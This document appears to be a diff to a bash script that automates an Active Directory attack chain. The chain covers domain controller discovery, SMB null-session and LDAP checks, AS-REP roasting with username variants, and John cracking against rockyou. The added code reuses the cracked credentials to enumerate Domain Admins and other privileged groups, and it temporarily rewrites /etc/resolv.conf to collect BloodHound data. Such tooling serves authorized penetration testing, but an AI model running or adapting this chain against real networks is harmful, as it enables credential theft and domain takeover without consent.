@@ -155,7 +155,6 @@ recon_dc() {
 
     echo "[*] === Recon on $dc ===" >&2
 
-    # 1. TCP RootDSE — naming context
     echo "[*] TCP RootDSE query..." >&2
     local base_dn
     base_dn=$(ldapsearch -x -LLL -H "ldap://$dc" -s base -b "" namingContexts 2>/dev/null \
@@ -167,11 +166,9 @@ recon_dc() {
         echo "[-] Could not retrieve naming context." >&2
     fi
 
-    # 2. SMB null session check
     echo "[*] SMB null session check..." >&2
     nxc smb "$dc" -u '' -p '' 2>&1 | tee "$outdir/smb_null.txt" >&2
 
-    # 3. LDAP signing check
     echo "[*] LDAP signing check..." >&2
     local signing
     signing=$(nmap -p 389 --script ldap-rootdse "$dc" 2>/dev/null \
@@ -212,7 +209,6 @@ asrep_roast() {
 
     echo "[*] === AS-REP roasting $domain ===" >&2
 
-    # Build casing variants
     awk '{print tolower($0)}' "$wordlist" > /tmp/adscope_users_lower.txt
     awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}' "$wordlist" > /tmp/adscope_users_title.txt
     awk '{print toupper($0)}' "$wordlist" > /tmp/adscope_users_upper.txt
@@ -242,7 +238,6 @@ asrep_roast() {
         fi
     done
 
-    # Deduplicate
     if [[ -s "$combined" ]]; then
         sort -u "$combined" -o "$combined"
         echo "[+] Total unique AS-REP hashes: $(grep -c '^\$krb5asrep\$' "$combined")" >&2
@@ -273,12 +268,10 @@ crack_asrep() {
         return 1
     fi
 
-    # --- Wordlist selection ---
     local chosen_wordlist=""
     if [[ -n "$wordlist" ]] && [[ -f "$wordlist" ]]; then
         chosen_wordlist="$wordlist"
     else
-        # Interactive prompt if we have a TTY
         if [[ -t 0 ]]; then
             echo
             echo "[?] Wordlist for cracking:"
@@ -306,7 +299,6 @@ crack_asrep() {
         fi
     fi
 
-    # Handle rockyou.txt.gz (Kali ships it compressed)
     if [[ "$chosen_wordlist" == *.gz ]]; then
         local decompressed="/tmp/adscope_rockyou.txt"
         echo "[*] Decompressing $chosen_wordlist..." >&2
@@ -323,13 +315,11 @@ crack_asrep() {
     echo "[*] Hash file : $hashfile" >&2
     echo "[*] Wordlist  : $chosen_wordlist" >&2
 
-    # Run John
     john --format=krb5asrep \
          --wordlist="$chosen_wordlist" \
          --pot="$potfile" \
          "$hashfile" 2>&1 | tee "$outdir/john_run.log" >&2
 
-    # Show cracked passwords
     echo
     echo "[*] Cracked credentials:" >&2
     john --show --format=krb5asrep --pot="$potfile" "$hashfile" \
@@ -343,6 +333,253 @@ crack_asrep() {
 }
 
 # ------------------------------------------------------------
+# Helper: parse John's cracked.txt to extract bare username
+# Handles both formats:
+#   $krb5asrep$23$user@DOMAIN:password   (raw hash output)
+#   $krb5asrep$user@DOMAIN:password      (John's --show output)
+# ------------------------------------------------------------
+parse_cracked_user() {
+    local cracked_file="$1"
+    local raw_user
+    raw_user=$(head -1 "$cracked_file" | cut -d: -f1)
+    echo "$raw_user" \
+        | sed -E 's/^\$krb5asrep\$([0-9]+\$)?//' \
+        | cut -d@ -f1
+}
+
+parse_cracked_pass() {
+    local cracked_file="$1"
+    head -1 "$cracked_file" | cut -d: -f2-
+}
+
+# ------------------------------------------------------------
+# Phase 6: Enumerate users and groups
+# ------------------------------------------------------------
+enumerate_users_groups() {
+    local dc="$1"
+    local domain="$2"
+    local username="$3"
+    local password="$4"
+    local outdir="recon_${dc//./_}"
+    local base_dn
+    base_dn=$(cat "$outdir/base_dn.txt" 2>/dev/null)
+
+    if [[ -z "$base_dn" ]]; then
+        echo "[!] Base DN not found — skipping enumeration." >&2
+        return 1
+    fi
+
+    echo "[*] === User and group enumeration ===" >&2
+
+    # --- Users ---
+    echo "[*] Enumerating users..." >&2
+    ldapsearch -x -LLL \
+        -H "ldap://$dc" \
+        -D "$username@$domain" \
+        -w "$password" \
+        -b "$base_dn" \
+        "(objectClass=user)" \
+        sAMAccountName userPrincipalName memberOf description \
+        2>/dev/null > "$outdir/users_raw.txt"
+
+    awk -F': ' '/^sAMAccountName:/ {print $2}' "$outdir/users_raw.txt" \
+        | sort -u > "$outdir/users.txt"
+
+    local user_count
+    user_count=$(wc -l < "$outdir/users.txt")
+    echo "[+] Users found: $user_count" >&2
+
+    # --- Groups ---
+    echo "[*] Enumerating groups..." >&2
+    ldapsearch -x -LLL \
+        -H "ldap://$dc" \
+        -D "$username@$domain" \
+        -w "$password" \
+        -b "$base_dn" \
+        "(objectClass=group)" \
+        cn member \
+        2>/dev/null > "$outdir/groups_raw.txt"
+
+    awk -F': ' '/^cn:/ {print $2}' "$outdir/groups_raw.txt" \
+        | sort -u > "$outdir/groups.txt"
+
+    local group_count
+    group_count=$(wc -l < "$outdir/groups.txt")
+    echo "[+] Groups found: $group_count" >&2
+
+    # --- Display summary ---
+    echo "" >&2
+    echo "────────────────────────────────────────" >&2
+    echo " USERS (first 20 of $user_count)" >&2
+    echo "────────────────────────────────────────" >&2
+    head -20 "$outdir/users.txt" >&2
+    if (( user_count > 20 )); then
+        echo "  ... and $(( user_count - 20 )) more" >&2
+    fi
+
+    echo "" >&2
+    echo "────────────────────────────────────────" >&2
+    echo " GROUPS (first 20 of $group_count)" >&2
+    echo "────────────────────────────────────────" >&2
+    head -20 "$outdir/groups.txt" >&2
+    if (( group_count > 20 )); then
+        echo "  ... and $(( group_count - 20 )) more" >&2
+    fi
+
+    # --- High-value group members ---
+    echo "" >&2
+    echo "────────────────────────────────────────" >&2
+    echo " HIGH-VALUE GROUP MEMBERS" >&2
+    echo "────────────────────────────────────────" >&2
+
+    local group members
+    for group in "Domain Admins" "Enterprise Admins" "Administrators" \
+                 "Domain Controllers" "Account Operators" "Backup Operators" \
+                 "Server Operators" "Remote Desktop Users"
+    do
+        members=$(ldapsearch -x -LLL \
+            -H "ldap://$dc" \
+            -D "$username@$domain" \
+            -w "$password" \
+            -b "$base_dn" \
+            "(&(objectClass=group)(cn=$group))" \
+            member 2>/dev/null \
+            | grep '^member:' \
+            | sed 's/^member: //' \
+            | awk -F',' '{print $1}' \
+            | sed 's/^CN=//' \
+            | tr '\n' ',' | sed 's/,$//')
+
+        if [[ -n "$members" ]]; then
+            printf "  %-25s : %s\n" "$group" "$members" >&2
+        fi
+    done
+
+    echo "" >&2
+    echo "[*] Results saved to $outdir/users.txt and $outdir/groups.txt" >&2
+}
+
+# ------------------------------------------------------------
+# Helper: resolve DC IP to FQDN using the DC's own DNS
+# ------------------------------------------------------------
+resolve_dc_fqdn() {
+    local dc_ip="$1"
+    local domain="$2"
+    local fqdn=""
+
+    # 1. Query the DC's own LDAP for its dNSHostName
+    fqdn=$(ldapsearch -x -LLL -H "ldap://$dc_ip" -s base -b "" \
+        dnsHostName 2>/dev/null \
+        | awk -F': ' '/^dnsHostName:/ {print $2; exit}')
+
+    # 2. Fallback: reverse DNS via the DC as resolver
+    if [[ -z "$fqdn" ]]; then
+        fqdn=$(dig +short @"$dc_ip" -x "$dc_ip" 2>/dev/null \
+            | sed 's/\.$//' | head -1)
+    fi
+
+    # 3. Fallback: use nxc to get the short name and append domain
+    if [[ -z "$fqdn" ]]; then
+        local shortname
+        shortname=$(nxc smb "$dc_ip" 2>/dev/null \
+            | grep -oP 'name:\K[^)]+' | head -1)
+        if [[ -n "$shortname" ]] && [[ -n "$domain" ]]; then
+            fqdn="${shortname}.${domain}"
+        fi
+    fi
+
+    echo "$fqdn"
+}
+
+# ------------------------------------------------------------
+# Helper: temporarily switch DNS to DC for FQDN resolution
+# ------------------------------------------------------------
+with_dc_dns() {
+    local dc_ip="$1"
+    shift
+
+    # Check if already resolvable
+    if getent hosts "$1" >/dev/null 2>&1; then
+        "$@"
+        return $?
+    fi
+
+    echo "[*] Temporarily switching DNS to $dc_ip..." >&2
+
+    if [[ ! -f /etc/resolv.conf.adscope.bak ]]; then
+        sudo cp /etc/resolv.conf /etc/resolv.conf.adscope.bak 2>/dev/null
+    fi
+
+    echo "nameserver $dc_ip" | sudo tee /etc/resolv.conf >/dev/null
+    sleep 1
+
+    "$@"
+    local rc=$?
+
+    # Restore
+    if [[ -f /etc/resolv.conf.adscope.bak ]]; then
+        sudo cp /etc/resolv.conf.adscope.bak /etc/resolv.conf 2>/dev/null
+        rm -f /etc/resolv.conf.adscope.bak
+    fi
+
+    return $rc
+}
+
+# ------------------------------------------------------------
+# Phase 7: BloodHound data collection (FQDN-aware, DNS swap)
+# ------------------------------------------------------------
+collect_bloodhound_inner() {
+    local dc_ip="$1"
+    local dc_fqdn="$2"
+    local domain="$3"
+    local username="$4"
+    local password="$5"
+    local outdir="recon_${dc_ip//./_}"
+    local bh_dir="$outdir/bloodhound"
+
+    bloodhound-python \
+        -d "$domain" \
+        -u "$username" \
+        -p "$password" \
+        -dc "$dc_fqdn" \
+        -ns "$dc_ip" \
+        -c DCOnly \
+        -o "$bh_dir" \
+        --zip 2>&1 | tee "$outdir/bloodhound_collect.log"
+
+    if ls "$bh_dir"/*.zip >/dev/null 2>&1; then
+        local zipfile
+        zipfile=$(ls "$bh_dir"/*.zip 2>/dev/null | head -1)
+        echo "[+] BloodHound data collected: $zipfile" >&2
+        echo "[*] Import this ZIP into BloodHound GUI for attack-path analysis" >&2
+    else
+        echo "[-] Collection may have failed. Check $outdir/bloodhound_collect.log" >&2
+    fi
+}
+
+collect_bloodhound() {
+    local dc_ip="$1"
+    local dc_fqdn="$2"
+    local domain="$3"
+    local username="$4"
+    local password="$5"
+    local outdir="recon_${dc_ip//./_}"
+    local bh_dir="$outdir/bloodhound"
+
+    if ! command -v bloodhound-python >/dev/null 2>&1; then
+        echo "[!] bloodhound-python not found. Install: pip install bloodhound" >&2
+        return 1
+    fi
+
+    echo "[*] === BloodHound data collection ===" >&2
+    mkdir -p "$bh_dir"
+
+    # Run the collection with DC-as-DNS if FQDN doesn't resolve
+    with_dc_dns "$dc_ip" collect_bloodhound_inner \
+        "$dc_ip" "$dc_fqdn" "$domain" "$username" "$password"
+}
+
+# ------------------------------------------------------------
 # Main
 # ------------------------------------------------------------
 banner
@@ -352,8 +589,8 @@ for cmd in fping nmap ip awk comm sort ldapsearch; do
     command -v "$cmd" >/dev/null || { echo "[!] Missing dependency: $cmd"; exit 1; }
 done
 
-# Optional tools — warn but don't exit
-for opt in nxc impacket-GetNPUsers john; do
+# Optional tools
+for opt in nxc impacket-GetNPUsers john bloodhound-python; do
     command -v "$opt" >/dev/null || echo "[!] Optional tool missing: $opt (some checks will be skipped)" >&2
 done
 
@@ -382,7 +619,7 @@ EOF
     esac
 done
 
-# Default username wordlist if not supplied
+# Default username wordlist
 if [[ -z "$WORDLIST" ]]; then
     for candidate in \
         /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
@@ -416,10 +653,8 @@ echo "[*] Confirmed written to live_confirmed.txt"
 echo "[*] Candidates written to live_candidates.txt"
 echo
 
-# Merge for scanning
 cat live_confirmed.txt live_candidates.txt 2>/dev/null | sort -u > scan_targets.txt
 
-# Exclude our own IP
 MY_IP=$(ip -o -4 addr show "$IFACE" | awk '{print $4}' | cut -d/ -f1)
 grep -v "^${MY_IP}$" scan_targets.txt > scan_targets.tmp && mv scan_targets.tmp scan_targets.txt
 
@@ -431,7 +666,6 @@ if find_dcs "scan_targets.txt" "dc_candidates.txt"; then
     echo "[*] DC candidates written to dc_candidates.txt"
     echo
 
-    # Extract domain from first DC
     FIRST_DC=$(head -1 dc_candidates.txt)
     DOMAIN=$(ldapsearch -x -LLL -H "ldap://$FIRST_DC" -s base -b "" namingContexts 2>/dev/null \
         | awk -F': ' '/^namingContexts:/ {print $2; exit}' \
@@ -446,15 +680,44 @@ if find_dcs "scan_targets.txt" "dc_candidates.txt"; then
         echo
     done < dc_candidates.txt
 
-    # Phase 4 — AS-REP roast against the first DC
+    # Phase 4
     if [[ -n "$WORDLIST" ]] && [[ -n "$DOMAIN" ]]; then
         asrep_roast "$FIRST_DC" "$DOMAIN" "$WORDLIST"
         echo
 
-        # Phase 5 — Crack the hashes
+        # Phase 5
         HASHFILE="recon_${FIRST_DC//./_}/asrep_all.hashes"
+        CRACKED_OUT="recon_${FIRST_DC//./_}/cracked.txt"
+
         if [[ -s "$HASHFILE" ]]; then
             crack_asrep "$HASHFILE" "$CRACK_WORDLIST"
+            echo
+
+            # Phase 6 & 7 — requires cracked creds
+            if [[ -s "$CRACKED_OUT" ]]; then
+                CRACKED_USER=$(parse_cracked_user "$CRACKED_OUT")
+                CRACKED_PASS=$(parse_cracked_pass "$CRACKED_OUT")
+
+                if [[ -n "$CRACKED_USER" ]] && [[ -n "$CRACKED_PASS" ]]; then
+                    echo "[*] Cracked credential: ${CRACKED_USER}:${CRACKED_PASS}" >&2
+                    echo
+
+                    # Phase 6
+                    enumerate_users_groups "$FIRST_DC" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
+                    echo
+
+                    # Phase 7 — resolve FQDN first
+                    DC_HOSTNAME=$(resolve_dc_fqdn "$FIRST_DC" "$DOMAIN")
+
+                    if [[ -n "$DC_HOSTNAME" ]]; then
+                        echo "[*] DC FQDN: $DC_HOSTNAME" >&2
+                        collect_bloodhound "$FIRST_DC" "$DC_HOSTNAME" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
+                    else
+                        echo "[!] Could not resolve DC hostname — skipping BloodHound." >&2
+                        echo "[!] Try manually: dig @$FIRST_DC -x $FIRST_DC" >&2
+                    fi
+                fi
+            fi
         fi
     fi
 else
